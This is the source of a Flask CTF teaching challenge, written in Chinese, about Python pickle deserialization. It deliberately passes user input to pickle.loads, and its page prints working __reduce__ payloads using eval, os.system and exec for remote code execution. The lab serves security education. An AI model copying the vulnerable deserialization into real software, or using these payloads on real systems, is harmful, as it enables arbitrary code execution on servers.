# -*- coding: utf-8 -*-
"""
unser3 · Python pickle 反序列化（反序列化第三课）
=================================================
漏洞点：pickle.loads(base64decode(用户输入)) —— pickle 不是"数据格式"，
        而是"对象重建指令流"，loads 会按指令调用任意 callable（__reduce__）。
考点：  ① __reduce__ 机制（返回 (callable, args)，loads 时执行 callable(*args)）；
        ② 构造回显型 payload：让 reduce 的返回值本身就是 flag；
        ③ 为什么"pickle = 任意代码执行"，防御该怎么做。
运行：  python app.py            （默认 http://127.0.0.1:5003/unser3/）
集成：  由 runtime/flask_challenges.py 以 Blueprint 挂到 /unser3。
说明：  模块导入时 os.chdir 到本目录，保证 payload 里的相对路径
        open('flag_unser3.txt') 在任何启动方式下都成立（本题组内唯一依赖 cwd 的题）。
"""
import base64
import html
import os
import pickle

from flask import Blueprint, Flask, request

_APP_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(_APP_DIR)  # 见模块 docstring；ssti1/ssti2 不依赖 cwd，组合运行时无冲突

FLAG_FILE = os.path.join(_APP_DIR, "flag_unser3.txt")
try:
    with open(FLAG_FILE, encoding="utf-8") as _f:
        FLAG = _f.read().strip()
except OSError:
    FLAG = os.environ.get("UNSER3_FLAG", "flag{unser3_MISSING}")

bp = Blueprint("unser3", __name__)


@bp.route("/", methods=["GET", "POST"])
def index():
    save = request.values.get("save", "")
    result = ""
    if save:
        try:
            data = base64.b64decode(save)
            obj = pickle.loads(data)  # ← 漏洞：反序列化不可信数据 = 执行任意"重建指令"
            result = "存档加载成功！对象内容：%r" % (obj,)
        except Exception as e:
            result = "存档加载失败：%s: %s" % (type(e).__name__, e)
    page = PAGE.replace("__SAVE__", html.escape(save, quote=True))
    page = page.replace("__RESULT__", html.escape(result))
    return page


PAGE = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>unser3 · pickle 反序列化 | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#0ea5e9;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
textarea{width:100%;min-height:70px;padding:10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink);font-family:Consolas,Menlo,monospace;font-size:12px}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
.result pre{border:0;margin:0}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">反序列化 · 第 3 关</span>
<h1>游戏存档加载器 —— Python pickle 反序列化</h1>
<div class="meta">难度：★★★☆☆ 中等 · 关卡 ID：<code>unser3</code> · 运行时：Python 3 / Flask</div>
</header>

<section class="card">
<h2>题目描述</h2>
<p>一个网页版小游戏把「存档」用 <code>pickle</code> 序列化后以 base64 存在浏览器里，读取存档时服务端 <code>pickle.loads()</code> 还原。页面允许你直接提交一段存档数据。</p>
<p>官方文档早就警告过：<i>"Never unpickle data from an untrusted source"</i>。想想为什么——然后让存档把 <b>flag_unser3.txt</b> 的内容带回来。</p>
</section>

<section class="card">
<h2>实验区</h2>
<form method="post" action="">
<label>存档数据（base64 的 pickle）：</label>
<textarea name="save" placeholder="gASV...">__SAVE__</textarea>
<div style="margin-top:8px"><button type="submit">加载存档</button></div>
</form>
<div class="result"><div class="t">加载器输出</div>
<pre>__RESULT__</pre></div>
<p style="color:var(--dim);font-size:13px">热身：提交 <code>gASVSAAAAAAAAACMAmFslIgA</code>（一个普通字符串 "af" 的 pickle）感受一下；再用 python 亲手生成：<code>python3 -c "import base64,pickle;print(base64.b64encode(pickle.dumps('hello')).decode())"</code></p>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p><b>pickle 是什么</b>：不是 JSON 那样的"数据格式"，而是<b>对象重建指令流</b>（一套基于栈的虚拟机字节码）。<code>loads</code> 执行这些指令来"重建对象"——而指令集里就有"调用函数"。</p>
<p><b>__reduce__：攻击者唯一需要控制的入口</b>。序列化一个对象时，pickle 询问它的 <code>__reduce__</code>，得到 <code>(callable, args)</code>；反序列化时执行 <code>callable(*args)</code> 并把返回值作为"重建结果"。于是：</p>
<pre>class Evil:
    def __reduce__(self):
        return eval, ("open('flag_unser3.txt').read()",)   # loads 时执行 eval(...) → 返回 flag 字符串

pickle.dumps(Evil())   # 存档里埋好了"指令"</pre>
<p>本关核心代码：</p>
<pre>data = base64.b64decode(save)
obj = pickle.loads(data)          # ← 漏洞：执行任意重建指令
result = f"存档加载成功！对象内容：{obj!r}"   # 把 loads 的返回值回显（回显型 RCE）</pre>
<p><b>常见 reduce 一览</b>（都有回显/副作用，按场景挑）：</p>
<table>
<tr><th>__reduce__ 返回值</th><th>效果</th></tr>
<tr><td><code>(eval, ("open('f').read()",))</code></td><td>eval 任意 Python，返回值被回显（本题主解）</td></tr>
<tr><td><code>(os.system, ("id",))</code></td><td>执行命令，无返回值（盲注场景配外带）</td></tr>
<tr><td><code>(eval, ("__import__('os').popen('id').read()",))</code></td><td>执行命令并回显输出</td></tr>
<tr><td><code>(exec, ("import os;os.system('...')",))</code></td><td>多语句执行（exec 无返回值）</td></tr>
</table>
<p style="color:var(--dim);font-size:13px">⚠ 小坑：<code>(os.popen('cmd').read, ())</code> 这种"绑定方法"写法在 dumps 阶段就会报 <code>cannot pickle '_io.TextIOWrapper'</code>——reduce 返回的每个元素本身必须可序列化，函数/内建可以，打开的文件对象不行。</p>
<p>用 <code>python3 -m pickletools 文件</code> 可以反汇编一段 pickle，直观看到 REDUCE 指令——去 writeup 看本题 payload 的反汇编。</p>
</section>

<section class="card">
<h2>渐进提示（点开一条想一条，别一口气全看）</h2>
<details><summary>提示 1：pickle.loads 会"执行"什么</summary><p>pickle 指令流里 REDUCE 指令会调用 callable。哪个环节决定 callable？对象序列化时的 <code>__reduce__</code> 返回 <code>(callable, args)</code>——而这个对象完全由你的存档字节决定。</p></details>
<details><summary>提示 2：怎么"生成"恶意存档</summary><p>写一个 Evil 类，<code>__reduce__</code> 返回 <code>(eval, ("open('flag_unser3.txt').read()",))</code>，然后 <code>base64.b64encode(pickle.dumps(Evil()))</code>。题目目录附了现成的 <code>exploit.py</code>（生成 + 提交 + 打印回显一条龙）。</p></details>
<details><summary>提示 3：为什么服务端会回显 flag</summary><p>题目把 <code>loads()</code> 的返回值直接展示。eval 的返回值 = 文件内容字符串 = <code>obj</code>——所以 flag 会原样出现在"对象内容"里。跑 <code>python3 exploit.py http://127.0.0.1:5003/unser3/</code> 即可。</p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="/unser2">← 上一关：unser2 · POP 链</a><a href="/unser4">下一关：unser4 · phar →</a></nav>
<footer>CTF Web 教学式靶场 · C 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=unser3&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
"""


def create_app(url_prefix="/unser3"):
    app = Flask(__name__)
    app.config["FLAG"] = FLAG
    app.register_blueprint(bp, url_prefix=url_prefix)
    return app


if __name__ == "__main__":
    create_app().run(host="127.0.0.1", port=5003, debug=False)
